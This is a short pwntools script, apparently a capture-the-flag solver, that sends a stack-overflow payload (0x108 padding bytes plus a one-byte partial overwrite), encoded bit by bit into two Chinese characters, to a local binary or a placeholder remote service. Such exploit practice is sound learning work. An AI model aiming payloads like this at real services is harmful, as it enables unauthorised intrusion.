#!/usr/bin/env python3

from pwn import *
import os

exe = ELF("./pwn")

context.binary = exe


if os.environ.get("ZELLIJ") == "0":
    context.terminal = [
        "zellij",
        "action",
        "new-pane",
        "-d",
        "right",
        "-c",
        "--",
        "bash",
        "-c",
    ]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def dbg(cmd=""):
    if args.LOCAL:
        gdb.attach(r, cmd)
        pause()


def convert_bytes_to_string(input_bytes):
    output = b""
    for byte in input_bytes:
        binary_string = format(byte, "08b")
        for bit in binary_string:
            if bit == "1":
                output += b"\xe5\x91\xa2"
            else:
                output += b"\xe9\xa2\x98"
    return output


context.log_level = "debug"


def main():
    global r
    r = conn()
    payload = b"a" * 0x108 + b"\x50"
    dbg()
    r.sendlineafter("：", convert_bytes_to_string(payload))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
